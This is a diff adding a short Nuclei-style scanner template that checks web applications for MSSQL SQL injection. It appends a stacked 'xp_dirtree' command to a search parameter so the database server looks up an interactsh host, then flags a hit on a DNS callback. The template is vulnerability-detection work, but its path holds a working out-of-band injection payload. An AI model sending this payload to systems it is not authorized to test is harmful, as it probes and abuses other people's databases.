@@ -1,0 +1,18 @@
+id: mssql-oob-dns
+
+info:
+  name: MSSQL xp_dirtree DNS OOB
+  author: openai
+  severity: high
+  tags: sqli,oob,mssql
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?search=1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\abc'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
